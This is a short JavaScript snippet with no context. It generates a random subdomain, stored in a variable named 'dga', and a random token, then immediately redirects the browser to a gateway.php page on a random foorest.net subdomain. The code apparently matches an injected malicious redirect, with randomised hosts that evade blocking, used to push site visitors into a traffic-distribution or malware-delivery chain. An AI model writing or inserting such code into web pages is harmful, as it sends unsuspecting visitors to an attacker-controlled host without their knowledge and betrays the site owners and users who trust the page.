function gen_rand() {
    var charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    var rand_len = Math.floor(Math.random() * 10000) % 15 + 4;
    var result = '';
    for (var i=0; i<rand_len; ++i) {
        let rand_pos = Math.floor(Math.random() * charset.length);
        result += charset.substring(rand_pos, rand_pos+1);
    }
    return result;
}

var dga = gen_rand();
var rand_str = gen_rand();
document.location = `https://${dga}.foorest.net/gateway.php?tk=${rand_str}`